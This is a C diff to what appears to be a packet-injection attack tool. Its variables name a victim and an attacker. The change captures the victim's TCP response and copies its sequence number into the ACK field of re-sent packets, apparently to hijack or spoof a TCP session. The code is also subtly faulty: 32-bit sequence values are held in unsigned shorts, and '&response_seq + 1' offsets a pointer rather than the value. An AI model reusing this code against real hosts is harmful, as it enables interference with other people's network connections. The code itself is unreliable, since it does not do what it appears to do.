@@ -17,6 +17,7 @@
 int packet_counter = 0;
 int firstime = 1;
 int bsend = 0;
+int receivedResponse = 0;
 
 // address ASCII arrays
 char eth_victim[ETH_ADDR_BITS], eth_attacker[ETH_ADDR_BITS], eth_new_victim[ETH_ADDR_BITS];
@@ -50,6 +51,9 @@ intf_t *i;
 //eth_t *e;
 pcap_t *handle;
 struct intf_entry ie;
+
+//response
+unsigned short response_ack, response_seq;
 
 // functions
 void packetHandler(u_char *userData, const struct pcap_pkthdr *pkthdr, const u_char *packet);
@@ -385,6 +389,11 @@ void packetHandler(u_char *userData, const struct pcap_pkthdr *packet_header, co
 	}
 	if (bsend == 1)
 	{
+		if (receivedResponse == 1)
+		{
+			//memcpy(&tcpHeader->th_seq, &response_seq, sizeof(tcpHeader->th_seq));
+			memcpy(&tcpHeader->th_ack, &response_seq + 1, sizeof(tcpHeader->th_ack));
+		}
 		n = pcap_sendpacket(handle, packet, packet_header->len);
 		if (n != 0)
 		{
@@ -400,6 +409,7 @@ void packetHandler(u_char *userData, const struct pcap_pkthdr *packet_header, co
 			getVictimResponse();
 		}
 		bsend = 0;
+		receivedResponse = 0;
 	}
 	else
 	{
@@ -630,6 +640,11 @@ void getVictimResponse()
 
 	responseTCPHeader = (struct tcp_hdr *)(response_packet + sizeof(struct eth_hdr) + sizeof(struct ip_hdr));
 
-	printf("\t\t\tgot response seq = %u\n", ntohl(responseTCPHeader->th_seq));
-	printf("\t\t\tgot response ack = %u\n", ntohl(responseTCPHeader->th_ack));
+	response_ack = responseTCPHeader->th_ack;
+	response_seq = responseTCPHeader->th_seq;
+
+	printf("\t\t\tgot response seq = %u\n", ntohl(response_seq));
+	printf("\t\t\tgot response ack = %u\n", ntohl(response_ack));
+
+	receivedResponse = 1;
 }
